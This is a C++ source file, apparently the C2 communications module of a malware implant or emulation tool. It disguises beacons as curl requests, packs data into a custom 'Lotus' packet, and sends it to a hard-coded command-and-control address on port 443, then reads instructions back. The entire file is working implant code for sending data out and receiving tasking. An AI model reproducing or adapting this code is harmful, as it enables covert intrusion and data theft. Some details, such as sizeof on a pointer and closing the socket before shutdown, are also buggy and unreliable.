#include "Comms.hpp"

#define EXPORT __attribute__((visibility("default")))

std::string buildGETRequestString(std::string clientID) {
    std::ostringstream buf;

    buf << "GET / HTTP/1.1\n";
    buf << "User-Agent: curl 7.64.2\n";
    buf << "Accept: */*\n";
    buf << "Connection: close\n";
    buf << "Cookie: erp=" << clientID;
    buf << "\n\n";

    return buf.str();
}

std::string buildPOSTRequestString(std::string lotusPacket, std::string clientID) {
    std::ostringstream buf;

    buf << "POST / HTTP/1.1\n";
    buf << "User-Agent: curl 7.64.2\n";
    buf << "Accept: */*\n";
    if (clientID != "") {
        buf << "Cookie: erp=" << clientID << "\n";
    }
    buf << "Content-Length: " << std::to_string(lotusPacket.length()) << "\n";
    buf << "Content-Type: application/x-www-form-urlencoded\n\n";
    buf << lotusPacket;

    return buf.str();
}

void buildLotusHeader(unsigned char * head, int data_length, int key_length, unsigned char * instruction) {
    // magic bytes (4 bytes)
    memcpy(head, MAGIC_BYTES, sizeof(MAGIC_BYTES));

    // payload length (4 bytes)
    unsigned char payload_length[4];
    payload_length[0] = data_length & 0xFF;
    payload_length[1] = (data_length >> 8) & 0xFF;
    payload_length[2] = (data_length >> 16) & 0xFF;
    payload_length[3] = (data_length >> 24) & 0xFF;
    memcpy(&head[PAYLOAD_LENGTH_POS], payload_length, 4);

    // key length (2 bytes)
    unsigned char key_length_char[2];
    key_length_char[0] = key_length & 0xFF;
    key_length_char[1] = (key_length >> 8) & 0xFF;
    memcpy(&head[KEY_LENGTH_POS], key_length_char, 2);

    memcpy(&head[INSTRUCTION_POS], instruction, sizeof(instruction));

    memcpy(&head[MARKER_1A_POS], MARKER_1, sizeof(MARKER_1));

    memcpy(&head[MARKER_2_POS], MARKER_2, sizeof(MARKER_2));

    memcpy(&head[MARKER_1B_POS], MARKER_1, sizeof(MARKER_1));

    memcpy(&head[MARKER_3_POS], MARKER_3, sizeof(MARKER_3));
}

EXPORT
void sendRequest(const char * type, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instruction, const char * clientID) {
    char httpGET[] = "GET";
    char httpPOST[] = "POST";
    std::string requestBody;

    std::string key = "";

    std::string clientIDStr = clientID;

    // build HTTP request string
    if (strcmp(type, httpGET) == 0) {
        std::cout << "[COMMS] Received data to GET, setting cookie to: " + clientIDStr << std::endl;
        requestBody = buildGETRequestString(clientIDStr);
    }
    else if (strcmp(type, httpPOST) == 0) {
        unsigned char header[HEADER_LENGTH] = { 0 };
        buildLotusHeader(header, data.size(), key.length(), *instruction);
        std::vector<unsigned char> lotus_packet(header, header + HEADER_LENGTH);

        // append key after header
        lotus_packet.insert(lotus_packet.end(), key.begin(), key.end());

        lotus_packet.insert(lotus_packet.end(), data.begin(), data.end());

        // convert data to string for building HTTP request
        std::string lotus_packet_str(lotus_packet.begin(), lotus_packet.end());

        std::cout << "[COMMS] Received data to POST: " + lotus_packet_str << std::endl;
        requestBody = buildPOSTRequestString(lotus_packet_str, clientIDStr);
    }
    else {
        return;
    }

    // create socket
    std::string host = "10.90.30.26";
    int port = 443;
    
    int sock_connect_status, bytes_read, sock;
    struct sockaddr_in serv_addr;
    unsigned char buffer[RESP_BUFFER_SIZE] = { 0 };

    // send data to socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cout << "[COMMS] Socket creation error" << std::endl;
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    // convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, &host[0], &serv_addr.sin_addr) <= 0) {
        std::cout << "[COMMS] Invalid address" << std::endl;
        return;
    }

    // connect to server
    if ((sock_connect_status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
        std::cout << "[COMMS] Connection Failed" << std::endl;
        return;
    }
    send(sock, requestBody.data(), requestBody.size(), 0);
    std::cout << "[COMMS] Message sent, attempting to read response..." << std::endl;

    // receive data from socket
    bytes_read = recv(sock, buffer, RESP_BUFFER_SIZE, MSG_WAITALL);

    if (bytes_read < 0) {
        std::cout << "[COMMS] No response received from C2" << std::endl;
        return;
    } else if (bytes_read == 0){
        std::cout << "[COMMS] Empty response received from C2" << std::endl;
    } else {
        std::cout << "[COMMS] Data received from C2" << std::endl;
    }

    close(sock);
    shutdown(sock, 2);

    // update response buffer and response length values for return to caller
    memcpy(*response, buffer, bytes_read);
    **response_length = bytes_read;

}
